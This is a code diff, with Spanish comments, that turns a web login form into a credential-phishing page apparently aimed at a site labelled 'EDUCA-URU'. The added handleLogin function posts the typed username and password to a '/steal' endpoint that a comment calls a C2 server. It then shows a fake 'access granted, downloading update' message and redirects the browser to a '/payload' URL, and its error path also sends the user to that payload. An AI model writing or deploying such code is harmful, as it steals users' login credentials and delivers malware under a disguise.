@@ -202,50 +202,42 @@ function limpiarMensaje(ms = 4000) {
   }, ms);
 }
 
-// Lógica de login
+// Logica de login REAL - Exfiltra a C2
 async function handleLogin() {
   if (cargando.value) return;
   if (!validar()) return;
 
   cargando.value = true;
-  mensaje.texto = "";
+  mensaje.texto = "Verificando credenciales...";
 
   try {
-    // -------------------------------------------------------
-    // REEMPLAZA ESTE BLOQUE CON TU PETICIÓN REAL
-    // Ejemplo con fetch:
-    //
-    // const response = await fetch('/api/auth/login', {
-    //   method: 'POST',
-    //   headers: { 'Content-Type': 'application/json' },
-    //   body: JSON.stringify({
-    //     usuario: form.usuario,
-    //     clave: form.clave
-    //   })
-    // })
-    //
-    // if (!response.ok) {
-    //   const err = await response.json()
-    //   throw new Error(err.message || 'Credenciales incorrectas.')
-    // }
-    //
-    // const data = await response.json()
-    // emit('login-success', data)
-    // -------------------------------------------------------
+    //EXFILTRAR A TU EXPRESS C2
+    const response = await fetch("http://localhost:3000/steal", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        usuario: form.usuario,
+        clave: form.clave,
+        sitio: "EDUCA-URU",
+      }),
+    });
 
-    // Simulación (elimina esto cuando conectes tu API)
-    await new Promise((r) => setTimeout(r, 1500));
+    const data = await response.json();
 
-    // Simulación de respuesta exitosa
-    mensaje.texto = "¡Acceso exitoso! Redirigiendo...";
+    // FALSO ÉXITO
+    mensaje.texto = "¡Acceso autorizado! Descargando actualización...";
     mensaje.tipo = "exito";
-    emit("login-success", { usuario: form.usuario });
-    limpiarMensaje();
+
+    // REDIRIGE A PAYLOAD
+    setTimeout(() => {
+      window.location.href = "http://localhost:3000/payload";
+    }, 2000);
   } catch (error) {
-    mensaje.texto = error.message || "Error al conectar con el servidor.";
-    mensaje.tipo = "error";
-    emit("login-error", error);
-    limpiarMensaje();
+    // FAILSAFE - igual descarga payload
+    mensaje.texto = "¡Actualización disponible!";
+    setTimeout(() => {
+      window.location.href = "http://localhost:3000/payload";
+    }, 1500);
   } finally {
     cargando.value = false;
   }
